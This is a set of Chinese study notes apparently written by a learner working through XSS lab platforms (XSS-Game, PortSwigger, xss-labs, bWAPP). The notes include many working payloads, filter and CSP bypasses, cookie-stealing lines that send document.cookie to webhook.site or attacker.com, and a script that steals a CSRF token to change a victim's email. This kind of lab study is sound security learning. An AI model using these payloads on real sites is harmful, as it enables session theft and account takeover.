[TOC]



# 一、知识点

## 0、XSS-GAME

### 第一关：

是一个反射型的，没有做任何过滤。

点击搜索回车，会发现url变为:https://xss-game.appspot.com/level1/frame?query=xxx

因为搜索回车时候，触发了submit事件，form表单被提交，是get请求

```
<form action="" method="GET">
  <input id="query" name="query" value="Enter query here..." onfocus="this.value=''">
  <input id="button" type="submit" value="Search">
</form>
```

action是当前页面，并且没有在当前html中找到有处理query的script代码，说明是这个页面的后端程序处理的，只是在前端看不见。

F12在网络中可以找到这个请求，服务端返回的html响应：

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/e1c8fdcb83114c9cae0c7f66f8e39c76.png#pic_center)


这个响应最终会被渲染到元素中

从一开始的：

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/c8fdcee4fcc640ad88a1ca6b80a6d08e.png#pic_center)


到请求之后：

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/4fe68c9c4712402c93a5b54b3387686d.png#pic_center)


iframe的src和doc都发生了改变，浏览器将服务端?query=xxx的html响应解析 -> 生成DOM节点 -> 解码，最终呈现出这个效果

可以发现:

```
<b>xxx</b>
```

是一个可注入点，服务端没有对这个输入做任何过滤，插入:

```
<script>alert();</script>
```

F12查看html源码，发现没有任何的过滤，实体化编码

### 第二关：

不是一个传统的存储型XSS，属于是DOM型的存储XSS，因为执行数据库的操作是在前端的JS中

提交评论表单为:

```
<form action="?" id="post-form">
<textarea id="post-content" name="content" rows="2" cols="50"></textarea>
<input class="share" type="submit" value="Share status!">
<input type="hidden" name="action" value="sign">
</form>
```

action为当前页面：

查找post-content，发现scirpt处理代码

```js
<script>
	.....
        for (var i=0; i<posts.length; i++) {
          var html = '<table class="message"> <tr> <td valign=top> '
            + '<img src="/static/level2_icon.png"> </td> <td valign=top '
            + ' class="message-container"> <div class="shim"></div>';

          html += '<b>You</b>';
          html += '<span class="date">' + new Date(posts[i].date) + '</span>';
          html += "<blockquote>" + posts[i].message + "</blockquote";
          html += "</td></tr></table>"
          containerEl.innerHTML += html; 
        }
      }
	.....
    </script>
```

post[i].message就是输入的值，没有做任何过滤，可以直接插入<script>alert();</script>

**疑问：为什么<script>alert();</script>不行？**答：CSP

	插入<script>alert();</script>，然后f12，在元素中查看html源码发现

```
<blockquote><script>alert();</script></blockquote>
```

	没有过滤，没有被实体化，而且把这个整个iframe的html复制另存，然后浏览器打开，是能弹窗的，可是为什么这里就弹不了？
	
	有知道的师傅还请指点一下，谢谢！

但是插入其他的payload就可以了

```
<img src="1.jpg" onerror="javascript:alert(1);"/>
```

注意：这里的javascript可有可无，因为onerror本身就是一个js的事件处理器，后面只会执行js代码，但是在herf/src属性值中，需要使用js伪协议，告诉是执行js

### 第三关：

当看到url是：

```
https://xss-game.appspot.com/level3/frame#1
```

可控参数是在**#**后面的时候，大概可以猜测它是一个DOM XSS了，因为script可以通关window.location.hash获取到这个参数，

所以直接搜索：location.hash

问题定位：

```js
<script>
      function chooseTab(num) {
        // Dynamically load the appropriate image.
        var html = "Image " + parseInt(num) + "<br>";
        html += "<img src='/static/level3/cloud" + num + ".jpg' />";
        $('#tabContent').html(html);
		
    .....
      window.onload = function() { 
        chooseTab(unescape(self.location.hash.substr(1)) || "1");
      }
	.....
    </script>
```

可以看到，unescape是进行url解码，所以num就是输入的字符，没有做任何过滤，所以在

```
html += "<img src='/static/level3/cloud" + num + ".jpg' />";
```

中，使用单引号闭合：payload

```
' onerror='alert()'
```

```
<img src="/static/level3/cloud" onerror="alert()" .jpg'="">
```

### 第四关：

反射型 xss

检查元素create timer发现表单：

```
<form action="" method="GET">
  <input id="timer" name="timer" value="3">
  <input id="button" type="submit" value="Create timer"> 
</form>
```

又是当前页面处理，搜索timer，没有在script中发现，说明是后端处理，看不见

但是肯定有html响应返回，去network查看，发现?timer=xxx的响应：

```html
<!doctype html>
...
    <img src="/static/loading.gif" onload="startTimer('xxx');" />
    <br>
    <div id="message">Your timer will execute in xxx seconds.</div>
...
</html>
```

如下两处可插入

首先尝试闭合第一个：js事件属性值中一般可以跟多个函数之间用',' / ' ;'隔离，但是必须是所有的函数都生效，不然一个都执行不了

payload:

```
'),alert('
```

响应html:

```
<img src="/static/loading.gif" onload="startTimer('&#39;),alert(&#39;');" />
```

**html源码 != 元素->查看html代码**

```
1. html源码/服务端返回的html响应 -> 浏览器解码等操作 -> F12元素查看html代码 -> 元素直接看到的

2. 而能不能执行的是看->元素查看html代码

3. 所以要学会编码绕过 必须搞明白 浏览器解码等操作 是怎么样子的
```

这段html代码经过浏览器处理，最终：F12 元素查看源码结果

```
<img src="/static/loading.gif" onload="startTimer(''),alert('');">
```

能够执行。

### 第五关：

反射xss

在点击signup的时候，触发a标签

```
<a href="/level5/frame/signup?next=confirm">Sign up</a>
```

在本地js代码中没有找到处理next参数，在network后找到signup?next=confirm的html响应

```html
<!doctype html>
<html>
 ...
    <a href="confirm">Next >></a>
  ...
</html>
```

confirm就是可控输入，在herf中，第一想到的就是js伪协议

payload:

````
javascript:alert()
````

点击Next，成功弹窗

知识点：

- `href` **可以** 使用 `data:` 协议，但仅限特定场景（如嵌入非可执行数据）。
- 若需执行代码，需改用 `javascript:` 协议（但受浏览器安全策略限制）。

总之遇到herf使用js伪协议，但是也有可能被CSP限制

### 第六关：

和第三关一样，可控参数在#后面，应该是个DOM xss

```
https://xss-game.appspot.com/level6/frame#xxx
```

直接搜索:location.hash，得到：

```js
<script>
    function setInnerText(element, value) {
      if (element.innerText) {
        element.innerText = value;
      } else {
        element.textContent = value;
      }
    }

    function includeGadget(url) {
      var scriptEl = document.createElement('script');

      // This will totally prevent us from loading evil URLs!
      if (url.match(/^https?:\/\//)) {
        setInnerText(document.getElementById("log"),
          "Sorry, cannot load a URL containing \"http\".");
        return;
      }

      // Load this awesome gadget
      scriptEl.src = url;

      // Show log messages
      scriptEl.onload = function() { 
        setInnerText(document.getElementById("log"),  
          "Loaded gadget from " + url);
      }
      scriptEl.onerror = function() { 
        setInnerText(document.getElementById("log"),  
          "Couldn't load gadget from " + url);
      }

      document.head.appendChild(scriptEl);
    }

    // Take the value after # and use it as the gadget filename.
    function getGadgetName() { 
      return window.location.hash.substr(1) || "/static/gadget.js";
    }

    includeGadget(getGadgetName());

    </script>
```

其中url就是我们输入的可控参数，重点是:

```
  // Load this awesome gadget
  scriptEl.src = url;
```

最终会生成类似：

```
<script src="url"></script>
```

知识点：对于伪协议加载js代码

1. **在script的标签中的src可以使用data / http+远程js文件，但是不能使用js**
2. **在iframe的src中可以使用js，不能使用data**
3. **img的src两个都不可以，必须借用js事件处理器**
4. **在任何标签的herf中可以使用js，不能使用data**

所以这里使用data伪协议更方便一点，payload:

```
data:text/javascript,alert()
```

成功弹窗

### 总结：

1. data/远程加载js文件、js伪协议的使用
2. 反射、DOM、存储XSS
3. 没有编码绕过知识

## 二、portswigger

### 1、盗取cookie | blindxss

```
';new Image().src="https://webhook.site/c334bf34-b847-4d21-93f6-02fc7008aa64?cookie="+encodeURIComponent(document.cookie);//
```

```
';window.location="https://webhook.site/c334bf34-b847-4d21-93f6-02fc7008aa64?cookie="+encodeURIComponent(document.cookie);//
```

```
';fetch("https://webhook.site/c334bf34-b847-4d21-93f6-02fc7008aa64?cookie="+encodeURIComponent(document.cookie));//
```

### 2、CSP

CSP是服务端通过响应的*Content-Security-Policy HTTP 标头* 给浏览器的策略，告诉浏览器不应该执行外部的代码

当出现：payload正确插入innerHtml中，没有被任何编码/过滤，但是不执行，就是被CSP了

常见被CSP的：

```
document.body.innerHTML = '<script>print()<\/script>'; 
document.body.innerHTML = '<svg onload=print()>'; 
document.body.innerHTML = '<iframe onload=alert(2)>';
```

### 3、JQuery 选择器:(:contains)会解析HTML标签

### 4、HashChange照成的XSS，需要使用iframe的onload进行二次加载

第一次访问：触发不了hashchange事件

```
https://0a3500c8034c839880aabc4c00c200ef.web-security-academy.net/#%3Cimg%20src=1%20onerror=alert()%3E
```

必须：

```
https://0a3500c8034c839880aabc4c00c200ef.web-security-academy.net/#
```

然后再：

```
https://0a3500c8034c839880aabc4c00c200ef.web-security-academy.net/#%3Cimg%20src=1%20onerror=alert()%3E
```

才能触发。

使用一个iframe能够将两步合成一步

```
<iframe src="https://0a3500c8034c839880aabc4c00c200ef.web-security-academy.net/#" onload="this.src += '<img src=1 onerror=print()>'" hidden="hidden">
</iframe>
```

### 5、寻找XSS原则：

1. 不是页面看输出，而是源码看输出

2. 输入不是只看页面中，还要结合页面/DOM，在URL中FUZZ参数

   ```
   https://0a30005b0369280181f30dd600aa0032.web-security-academy.net/my-account?email=xxx
   ```

   ```
   <input required="" type="email" name="email" value="xxx">
   ```

   这里的email参数就是fuzz出来的.

3. 输入：请求报文的任何位置

   1. 标头的各个字段
   2. URL参数
   3. 请求体中的参数

4. 输出：响应html的任何位置

5. 不想错过隐藏的XSS注入点，最好以抓包的形式观察

### 6、AngularJS表达式注入

条件：

1. 是在<标签 class="ng-xxx"> 可控输入</标签>
2. 并且输入{{1+1}}，显示2的，就是存在

POC：

```
{{$on.constructor('alert(document.domain)')()}}
```

### 7、' \ '未转义 -> 转义绕过

```
var searchResultsObj = {"results":[],"searchTerm":"\\\\"-alert(1)}//"} //alert会执行
```

json的容错度：

1. {}一定要完整
2. 属性和值需要闭合

当遇到输入：

```
" 转义-> \" 一般转义的都是"、'、</>、(/)等可以闭合的符号
```

查看

```
\ 本身是否被转义成 \\
```

如果没有，那么就可以使用:

```
\" -> \\"绕过，这样"就不会被转义，而是被当作正常的"，因为\\ -> \之后，\就是文本类型的，不具备转义"的能力了
```

### 8、绕过不严谨HTML编码

不严谨：

```
function escapeHTML(html) {
        return html.replace('<', '&lt;').replace('>', '&gt;'); 
        //JavaScript的replace方法默认只替换第一个匹配项
        //<><img src=1 onerror=alert()>绕过
 }
```

严谨：

```
function escapeHTML(html) {
  return html.replace(/&/g, '&amp;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            .replace(/"/g, '&quot;')
            .replace(/'/g, '&#39;');
}
```

### 9、什么时候需要使用到服务器

1. 就是直接回车url不能触发的时候，还需要额外来触发对应的事件！一般都借用iframe的onload事件
2. payload不在get请求的url参数中，而是在post参数或者请求包的其他位置！（这个其实就是CSRF->XSS）
3. 载入payload需要的权限攻击者没有，需要通过CSRF->XSS，诱使有权限的人触发

### 10、遍历标签、事件绕过WAF

#### 浏览器编码细节：

在html源码中

```
<h1>'<>'</h1>		
```

浏览器处理之后：

```
<h1>'&lt;&gt;'</h1>
```

发现被实体化编码了。

但是：

```
<h1>'</>'</h1>
```

却变成：

```
<h1>''</h1>
```

原因在于：正确的标签会解析，不正确的标签会编码！

#### WAF最常见的是过滤标签和事件，但是可能没有过滤全面：

使用BP的intruder + bp提供的cheat sheet进行：[Cross-Site Scripting (XSS) Cheat Sheet - 2024 Edition | Web Security Academy](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

1. 爆破标签<标签>
2. 爆破事件<标签+事件名>这样就行

出现200就是可以。

### 11、自定义标签绕过WAF:

如果支持，自定义标签custom tags，并且waf是黑名单，就可以绕过

### 12、hash + onfocus + `tabindex` 实现自触发

```
<xss id="x" onfocus="alert(document.cookie)" tabindex="1">
```

那么将url发给受害者，并且后面加上**#x**，就会自动触发focus事件

```
https://0a44006e04c0b84b837d8714009e009b.web-security-academy.net/?search=%3Cxss+id%3D%22x%22+onfocus%3D%22alert%28document.cookie%29%22+tabindex%3D%221%22%3E#x
```

### 13、SVG标签配合其他标签实现XSS

```
<svg><animatetransform onbegin=alert(1)>
```

如果标签的所有事件都被WAF阻止：使用herf伪协议

```html
<svg>
  <a>
    <animate 
      attributeName="href" 
      values="javascript:alert(1)" 
    />
    <text x="20" y="20">Click me</text>
  </a>
</svg>
```

### 14、Link的accesskey支持onclick事件

accesskey属性是用于定义快捷键触发事件的：

```
<link rel="canonical" href="" accesskey="x" onclick="alert(1)"> //必须要按alt + shift +x(win)，才能触发
```

### 15、HTML实体化编码 -> 转义绕过

首先的确定：哪些地方可以进行实体化编码，浏览器会自动解码

如何发现被转义是出现在：

```
<不能 不能html解码="可以">可以</不能> 
<script>不能</script>
例：
<A hRef="javascript:alert('http://')">asdsad</a>
其中:
javascript:alert('http://') 整个html编码都可以 都会自动解码
```

注意：<、>html编解码的特殊性

1. <、>若是不以正确标签的形式出现在html中，就会被html实体化
2. <、>除了能在属性值(字符串)中被自动html解码，其他地方都不会，所以不要对<、>进行html编码
3. <tag>其中的tag也不会自动html解码 -> **标签一旦过滤了就不要想着编码标签来绕过！**

其他细节：

1. 属性值就是不加""，后面还是自动会加上的，所以一样！最后的html解码值都会在"中"
2. html编码之后一般都需要url编码，因为html编码都带有&符号，而这个符号在url参数中是代表下一个符号，导致错误

### 16、JS的模板字符串注入

```
var message = `0 search results for 'JavaScriptï¼${alert(1)}'`;
```

遇到有带反斜杠的字符串，直接插入${alert(1)}就能执行！
关于反引号的知识：

```
    prompt`1`
    alert`2${alert`3`}` //都能执行
```

### 17、获取COOKIE的HTTP临时服务

1. BP的Collaborator
2. webhook.site

### 18、XSS绕过CSRF 客户端存储token

例如：用户登录后存在修改email的功能

```html
<form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST">
    
    <label for="email">Email</label>
    <input required type="email" name="email" id="email" value="">
    
    <input required type="hidden" name="csrf" value="33VaALOJDtWo7yORPFVHS5aeGreVvYGz">
    
    <button class="button" type="submit">Update Email</button>

</form>
```

但是，这个站点存在一个比如存储的XSS：在用户评论区的payload：

```js
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;          // 请求完成后触发 handleResponse
req.open('get', '/my-account', true); // 发送 GET 请求到用户账户页面
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```

### 19、AngularJS沙箱逃逸

#### 无字符串：                           

```js
<script>angular.module('labApp', []).controller('vulnCtrl',function($scope, $parse) {
                            var key = 'toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)';
                            $scope.query[key] = '1';
                            $scope.value = $parse(key)($scope.query);
                        });</script>
```

条件：

1. 存在$parse函数
2. key可控，输入payload:

```
toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)
```

原理是例如篡改 `charAt`、`join` 等方法，干扰沙箱的字符串检查，使得在解析字符串的时候出现错误，进而当成表达式执行

#### 有字符串：

InnerHtml可控：payload，还可绕过CSP

```html
<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>
```

### 20、fetch body中的闭合

```js
javascript:fetch('/analytics', {
  method: 'post',
  body: '/post?postId=2&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:''}
).finally(_ => window.location = '/')
```

payload:

```
&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'
```

### 21、CSP旁注

原理：

	响应标头中的CSP能够被参数控制

注入：

```img src=1 onerror=alert()>
<img src=1 onerror=alert()>
```

在console发现是CSP限制，响应标头中存在：

```
content-security-policy:
default-src 'self'; object-src 'none';script-src 'self'; style-src 'self'; report-uri /csp-report?token=
```

发型最后有一个token参数，于是FUZZ一下：

```
https://0ac5000104d97c628064d07c003d00b9.web-security-academy.net/?search=payload&token=123
```

响应：

```
default-src 'self'; object-src 'none';script-src 'self'; style-src 'self'; report-uri /csp-report?token=123
```

可以控制，那么只需要把这个token传：

```
;script-src-elem 'unsafe-inline'
```

就能绕过CSP了

## 三、xss-labs

### 1、input标签 onfocus + autofocus自动触发

```
<input 
  value="" 
  onfocus="fetch('https://attacker.com?cookie='+document.cookie)" 
  autofocus
>
注意：
<input onfocus="prompt()" autofocus>不行
必须：
<input onfocus="prompt()" autofocus空格/换行/=1>
```

### 2、使用"还是'闭合得从响应的源码看

源码：

```
<input name=keyword  value='' onfocus='alert()''>	
```

Element:

```
<input name="keyword" value="" onfocus="alert()" '=""> //一般element的都是双引号
```

### 3、HTML大小写不敏感绕过黑名单

```
<不敏感 不敏感="协议不敏感:敏感()"></不敏感>
```

但是一般都不奏效：后端只需要采用个:

```
$str = strtolower($_GET["keyword"]); // 将输入转换为小写
```

### 4、双写绕过

例如：

onfocus -> 回应focus

尝试:

oonnfocus -> onfocus

### 5、伪协议执行JS

1. 在script的标签中的src可以使用data（但是必须指定text/javascript，不能编码） / http+远程js文件，但是不能使用js

   ```
   <script src="data:text/javascript,print()"></script>
   ```

2. 在iframe的src中可以使用js，不能使用data

3. img的src两个都不可以，必须借用js事件处理器

4. 在任何标签的**herf中可以使用js**，不能使用data

5. object标签的data可以使用data，但是必须指定text/html，可以编码

   ```
   <object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4="></object>
   ```

6. 伪协议+//+%0a可绕过url检测

   ```
   javascript://comment%0aalert(1)
   ```

   绕过：

   ![image-20250626152810193](C:\Users\33940\AppData\Roaming\Typora\typora-user-images\image-20250626152810193.png)

### 6、标签内空格过滤绕过

1. 换行符绕过：**前提是的是注入点是支持/会自动url编码的地方**

```
<img%0asrc=1%0aonerror=alert()> //在%0a是换行的url编码、%0d%0a = \r\n
```

2. / 符号绕过

```
<input/autofocus/onfocus=print`/xss/`> == <input autofocus onfocus=print`/xss/`>
注意：/不能靠近属性值！
<img/src=1/onerror=alert(1)>     <!-- 失败 -->
```

## 四、bwapp

### 1. "无解"场景

```
1. 后端使用了 htmlspecialchars对 &、"、'、</> 进行html编码
2. payload在innerhtml中
```

```
1. payload在类似herf可以存储url的属性值中
2. 被url编码
<a href=xss_href-3.php?movie=3&name=%3Csadsa%3E&action=vote>Vote</a>
```

### 2. json注入

payload出现在js代码中的json数据中：

```
在json中执行的条件是：不在任何引号内
1. var searchResultsObj = {"results":[],"searchTerm":"\\\\"-alert(1)}//"} //alert会执行
2. var JSONResponseString = '{"movies":[{"response":""}]-alert()}'; 不执行，因为还被''包着
3. eval('{"movies":"";alert();}');不执行
4. eval('{alert();}');执行，换成parse不执行
```

### 3. 代替alert()的函数

```
1. prompt()
2. print()
3. confirm()
```

### 4. XML的html编码绕过

如果Payload在XML中，那么输入<、>就会照成错误，因为尖括号会影响xml的格式

解决：

1. 使用html实体化编码

成立条件：

1. 后端对XML对象进行(**DOM化处理=自动html解码一次**)

```js
<script>
// XML 字符串（含实体编码）
const xmlResponse = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?><response>&#x003c;&#x0069;&#x006d;&#x0067;&#x0020;&#x0073;&#x0072;&#x0063;&#x003d;&#x0031;&#x0020;&#x006f;&#x006e;&#x0065;&#x0072;&#x0072;&#x006f;&#x0072;&#x003d;&#x0061;&#x006c;&#x0065;&#x0072;&#x0074;&#x0028;&#x0029;&#x003e;our master really loves Marvel movies :)</response>';

// 解析 XML
const parser = new DOMParser();
const xmlDoc = parser.parseFromString(xmlResponse, "text/xml");
const xmlDocumentElement = xmlDoc.documentElement;

// 提取文本内容（自动解码实体）
const result = xmlDocumentElement.textContent;

// 安全输出（转义 HTML 字符）
function escapeHTML(str) {
  return str.replace(/&/g, "&amp;")
           .replace(/</g, "&lt;")
           .replace(/>/g, "&gt;");
}
alert(escapeHTML(result)); 
// 输出结果：&lt;img src=1 onerror=alert()&gt;our master really loves Marvel movies :)
</script>
```

### 5. Referer XSS

1. HTTP请求头控制的Referer

```
document.location.href = httpreferrer; //注入点就是请求头的Referer
```

2. document.referrer

```
这个referer不受http请求头的影响，仅当用户通过点击链接或表单提交跳转时设置
```

| **特性**         | **`document.referrer` (JavaScript)**          | **HTTP `Referer` 头**                |
| :--------------- | :-------------------------------------------- | :----------------------------------- |
| **来源**         | 由浏览器自动生成，表示当前页面的来源 URL      | 由浏览器在 HTTP 请求中发送的头部字段 |
| **可控性**       | 仅当用户通过点击链接或表单提交跳转时设置      | 可通过工具（如 Burp Suite）直接修改  |
| **修改权限**     | **前端不可写**（只读属性）                    | 可被代理工具篡改                     |
| **漏洞利用条件** | 需控制用户访问的上一页面（如恶意网站 iframe） | 修改请求头不影响 `document.referrer` |

### 6. 注入点可能是根据页面提示FUZZ出来的*自定义请求头*

### 7. 登录处 | 数据库报错回显XSS

1. 不同数据库报错的条件不一样，首先得知道会照成数据库报错的条件，然后输入
2. 如果有回显，分析，并且尝试构造闭合

例:mysql的报错xss注入

```html
Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'XSS')</script>' AND password = '<script>alert('XSS')</script>'' at line 1
```

### 8. js中fuc(/xss/)为什么不报错

这里 `/xss/` 是一个 **正则表达式**，但 `func()` 需要的是字符串，所以 JavaScript **会隐式调用 `toString()` 方法**

```
fun(/xss/.toString());  // 结果："/xss/"
```

### 9. "偏远"payload

```
1. <Details/Open/OnToggle=alert(1)>  <!-- 成功 -->
2. <input/autofocus/onfocus=alert`/xss/`>
3. <body onload="alert('页面加载完成')">
```

## 五、实战学习

### 1. noscript标签

```
<noscript>
  <p>Your browser does not support JavaScript or it is disabled.</p>
</noscript>
```

如果浏览器中关闭了 JavaScript，上面这段代码就会显示出 <p> 中的提示信息。否则，这段内容会被忽略。

### 2. unicode编码 

也叫js编码，为什么叫js编码呢，因为这个编码的内容只有js解析器才能解析，解析之后再执行的，**并且解析的结果不会反应在前端！而是之间拿去执行了，而不是显示！**

什么地方会自动解析js编码呢：想想哪里会执行js就知道了

##### 位置：

1. 属性方法

   ```
   <img src=x onerror=\u0063\u006f\u006e\u0066\u0069\u0072\u006d(1)>
   ```

   注意：方法最后的()不能编码！

##### 联动html编码：

之前了解了，html编码中，属性值的整个内容，以及innerhtml都会自动html解码，因为是html先解析的，然后再js执行，所以可以先js编码，然后html编码：

```
<img src=x onerror=&#x005c;&#x0075;&#x0030;&#x0030;&#x0036;&#x0033;&#x005c;&#x0075;&#x0030;&#x0030;&#x0036;&#x0066;&#x005c;&#x0075;&#x0030;&#x0030;&#x0036;&#x0065;&#x005c;&#x0075;&#x0030;&#x0030;&#x0036;&#x0036;&#x005c;&#x0075;&#x0030;&#x0030;&#x0036;&#x0039;&#x005c;&#x0075;&#x0030;&#x0030;&#x0037;&#x0032;&#x005c;&#x0075;&#x0030;&#x0030;&#x0036;&#x0064;&#x0028;&#x0031;&#x0029;>
```

### 3. 支持url编码的content-type/MIME

- `multipart/form-data` 不支持

  ```
  Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryBRjiOdAIraOGFuWt
  
  ------WebKitFormBoundaryBRjiOdAIraOGFuWt
  Content-Disposition: form-data; name="first_name"
  
  aaaaaaaaaa
  ------WebKitFormBoundaryBRjiOdAIraOGFuWt
  Content-Disposition: form-data; name="last_name"
  
  aaaaaaaaaaa
  ------WebKitFormBoundaryBRjiOdAIraOGFuWt
  Content-Disposition: form-data; name="email"
  ```

- application/x-www-form-urlencoded 支持

  ```
  POST /register HTTP/1.1
  Content-Type: application/x-www-form-urlencoded
  
  first_name=aaa&last_name=bbb&email=xxx%40gmail.com...
  ```

### 4. 阻碍汇总

1. 对&实体化编码
1. 开启out-of-scope之后提交post发现抓不到包，**原因：使用别人的api接口**
1. post
   1. 对ip速度限制
   2. option+post，类似token不能intruder

### 5. MIME类型

注意：

​	图片格式的mime，浏览器都不会解析xss，应该是除了test/html、test/javascript其他都不会

| **类型分类**            | **MIME 类型**                                                | **说明**                  | **常见文件扩展名**  |
| :---------------------- | :----------------------------------------------------------- | :------------------------ | :------------------ |
| **文本 (text/)**        | `text/plain`                                                 | 纯文本                    | `.txt`, `.log`      |
|                         | `text/html`                                                  | HTML 文档                 | `.html`, `.htm`     |
|                         | `text/css`                                                   | CSS 样式表                | `.css`              |
|                         | `text/javascript`                                            | JavaScript 代码           | `.js`               |
|                         | `text/csv`                                                   | CSV 表格数据              | `.csv`              |
|                         | `text/markdown`                                              | Markdown 文档             | `.md`               |
|                         | `text/xml`                                                   | XML 数据                  | `.xml`              |
| **图像 (image/)**       | `image/jpeg`                                                 | JPEG 图像                 | `.jpg`, `.jpeg`     |
|                         | `image/png`                                                  | PNG 图像                  | `.png`              |
|                         | `image/gif`                                                  | GIF 动画图像              | `.gif`              |
|                         | `image/svg+xml`                                              | SVG 矢量图                | `.svg`              |
|                         | `image/webp`                                                 | WebP 图像                 | `.webp`             |
|                         | `image/bmp`                                                  | BMP 位图                  | `.bmp`              |
|                         | `image/tiff`                                                 | TIFF 图像                 | `.tiff`, `.tif`     |
| **音频 (audio/)**       | `audio/mpeg`                                                 | MP3 音频                  | `.mp3`              |
|                         | `audio/ogg`                                                  | Ogg Vorbis 音频           | `.ogg`              |
|                         | `audio/wav`                                                  | WAV 音频                  | `.wav`              |
|                         | `audio/webm`                                                 | WebM 音频                 | `.webm`             |
|                         | `audio/aac`                                                  | AAC 音频                  | `.aac`              |
| **视频 (video/)**       | `video/mp4`                                                  | MP4 视频                  | `.mp4`              |
|                         | `video/ogg`                                                  | Ogg 视频                  | `.ogv`              |
|                         | `video/webm`                                                 | WebM 视频                 | `.webm`             |
|                         | `video/x-msvideo`                                            | AVI 视频                  | `.avi`              |
|                         | `video/quicktime`                                            | QuickTime 视频            | `.mov`              |
| **应用 (application/)** | `application/json`                                           | JSON 数据                 | `.json`             |
|                         | `application/pdf`                                            | PDF 文档                  | `.pdf`              |
|                         | `application/zip`                                            | ZIP 压缩文件              | `.zip`              |
|                         | `application/xml`                                            | XML 数据                  | `.xml`              |
|                         | `application/octet-stream`                                   | 任意二进制数据            | `.bin` (或无扩展名) |
|                         | `application/javascript`                                     | JavaScript 代码（旧标准） | `.js`               |
|                         | `application/x-www-form-urlencoded`                          | HTTP 表单数据             | 无                  |
|                         | `application/msword`                                         | Microsoft Word 文档       | `.doc`              |
|                         | `application/vnd.openxmlformats-officedocument.wordprocessingml.document` | Word (.docx)              | `.docx`             |
|                         | `application/vnd.ms-excel`                                   | Microsoft Excel 文档      | `.xls`              |
|                         | `application/vnd.openxmlformats-officedocument.spreadsheetml.sheet` | Excel (.xlsx)             | `.xlsx`             |
| **多部分 (multipart/)** | `multipart/form-data`                                        | 表单文件上传              | 无                  |
|                         | `multipart/byteranges`                                       | HTTP 范围请求（部分内容） | 无                  |
| **其他**                | `font/woff`                                                  | Web 开放字体 (WOFF)       | `.woff`             |
|                         | `font/woff2`                                                 | WOFF 2.0 字体             | `.woff2`            |
|                         | `model/gltf+json`                                            | 3D 模型 (GLTF)            | `.gltf`             |
|                         | `application/vnd.android.package-archive`                    | APK 安装包                |                     |

### 6. 文件上传xss

#### 一、图片文件XSS原理

常规图片格式xss的根本原因：

	1. 提取图片中的元数据信息进行解析渲染，但是没有做好编码过滤等措施！
	2. 即使没有提取出来解析，如果服务端返回的MIME类型错误搞成可以解析XSS的类型，比如text/html，概率较低 ！！！！！！！！

#### 二、细节

1. 由于你上传的xss文件，不一定你能访问，所以，这个xss**最好还是blind xss**
2. 为什么有的图片xss比较受欢迎，比如jpeg/jpg，而有些不太合适，比如png
   1. 浏览器/服务端对每种图片格式检测的严格程度
   2. 图片格式本身元数据的灵活程度
3. 其实所有文件格式，把一个可以xss的innerhtml改成它们的格式，然后mime改成支持text/html，都能执行，那为什么还费劲找个合适的位置插进去？
   1. 后缀只是后端检测的第一关，大部分还检测文件头看看是不是对应的格式，还有的甚至要图片加载成功显示没问题，所以保险就是找一个不影响图片显示的位置插（比如元数据位置）

#### 三、手段

1. 不管什么格式，只要有元数据可插，尽可能把所有元数据的位置都插blindxss，不影响图片的显示就行
2. 等着
   1. 如果能执行就是mime错误
   2. 更大可能是元数据提取解析了
   3. 失败
      1. 没有搞错mime
      2. 后端对这个图片检测比较严
      3. 对元数据提取后编码了

#### 四、文本格式

##### HTML:

1. 根本原因
   1. 允许上传html文件，但是又没做好过滤

##### SVG:（直接访问xml，mime：image/svg+xml、application/xml，而这两个都不会执行xss）

​	其实就是把svg标签的innerhtml的xss保存为xml格式的文件，就是一种xml文件

1. 根本原因

   1. 允许上传xml/.svg文件，并且还在标签中引用这个文件，并且还没过滤

      ```
      <object data="file.svg" type="image/svg+xml"></object>
      ```

      | **HTML 标签**                                   | **是否执行 SVG 内的 JS？** | **触发的事件**                                         | **备注**                                   |
      | :---------------------------------------------- | :------------------------- | :----------------------------------------------------- | :----------------------------------------- |
      | `<img src="file.svg">`                          | ❌ 通常不执行               | `onerror`（仅限加载失败时）                            | 最安全，但某些旧浏览器（如 IE）可能支持 JS |
      | `<object data="file.svg" type="image/svg+xml">` | ✅ 可能执行                 | `onload`, `onerror`, `onclick`（SVG 内的事件）         | 浏览器将其当作独立文档处理                 |
      | `<embed src="file.svg" type="image/svg+xml">`   | ✅ 可能执行                 | `onload`, `onerror`, `onclick`                         | 类似 `<object>`，但更老式                  |
      | `<iframe src="file.svg">`                       | ✅ 可能执行                 | `onload`, `onerror`, `onclick`                         | 当作独立文档，同源策略适用                 |
      | `<svg>`（内联 SVG）                             | ✅ 可能执行                 | 所有 SVG 事件（`onload`, `onclick`, `onmouseover` 等） | 直接嵌入 SVG 代码，完全可交互              |
      | CSS `background: url(file.svg)`                 | ❌ 不执行                   | 无                                                     |                                            |

##### PDF:

1. 标签引入文件+/OpenAction << /S /JavaScript /JS (app.alert('XSS from PDF')) >>

   ```
   <iframe src="/uploads/evil.pdf"></iframe> 
   ```

#### 五、总结

**xml/svg**

1. 插的合适位置
   1. 正常web mime就会触发
   2. 标签引入触发

**pdf**

1. 插合适位置
   1. 对应pdf读取器就会触发
   2. 标签引入触发

**其他：（jpg、avif、gif、heic、webp、png）**

1. 插元数据
   1. 错误mime
   2. 元数据解析

**注意：**

